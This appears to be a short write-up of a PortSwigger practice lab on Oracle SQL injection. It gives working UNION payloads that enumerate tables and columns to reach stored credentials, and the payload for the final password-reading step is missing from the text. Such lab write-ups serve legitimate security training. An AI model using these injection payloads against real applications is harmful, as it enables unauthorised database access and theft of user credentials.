# Lab: SQL injection attack, listing the database contents on Oracle
![](https://img.shields.io/badge/Difficulty-PRACTITIONER-blue)

**Lab Link:** [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)

---

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the administrator user. 
---

### My solution:

I crafted and injected this payload to see all tables and found the table that contains the users:
`/filter?category=NULL' UNION SELECT table_name, NULL FROM user_tables--`

Then I viewed which columns the users table has by crafting and injecting this payload:
`/filter?category=NULL' UNION SELECT column_name, NULL FROM ALL_TAB_COLUMNS WHERE table_name = 'USERS_LBEGDW'--`

It returned this: <img width="243" height="115" alt="image" src="https://github.com/user-attachments/assets/a638004b-2139-49e0-beee-43aa9c931a6f" />

So I crafted and injected this payload to see the password for the admin user:

It returned this: <img width="262" height="215" alt="image" src="https://github.com/user-attachments/assets/9794a037-6e88-40d3-97b4-912d4ee5a14f" />

To finish the lab I logged in as normal with admin credentials.
